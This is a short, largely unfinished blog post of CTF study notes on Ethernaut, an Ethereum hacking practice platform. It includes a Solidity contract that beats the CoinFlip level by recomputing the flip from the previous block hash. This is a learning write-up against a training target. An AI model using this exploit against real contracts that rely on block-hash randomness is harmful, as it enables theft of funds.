---
layout: post
title: BlockChain Notes & Ethernaut Practice
author: Rechn0
date: 2022-02-25 11:30 +0800
last_modified_at: 2022-02-25 11:30 +0800
tags: [blockchain, ethernaut]
categories: ctf, blockchain
toc:  true
math:  true
---

ctf区块链入门杂记

最近入门了较简单的区块链知识，深入了一些基础概念，整体知识框架还不是很清晰……作学习笔记同步参考

## **Notes**

**BlockChain**

**Ethereum**

## **Ethernaut Platform**

ctf区块链方向练习平台

### **0.Hello Ethernaut**

[Rinkeby ether++](https://faucets.chain.link/rinkeby)

熟悉基本的以太坊操作。安装以太坊钱包MetaMask并注册账户，选择使用Rinkeby测试网络，将账户与平台连接即可

使用chrome控制台与智能合约进行简单交互操作，算是入门练习

![0.png](https://github.com/Rechn0/Rechn0.github.io/blob/gh-pages/store/Ethernaut/0.png)

### **1.Fallback**

### **2.Fallout**

### **3.CoinFlip**

```javascript
pragma solidity 0.4.24;

contract solve {
    CoinFlip targ=CoinFlip(0x3ffDBc34D9B1249deA89d3c3DCaF394E3f4A2B47);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hack() public{
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        targ.flip(side);
    }
}

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}
```

### **4.Telephone**

---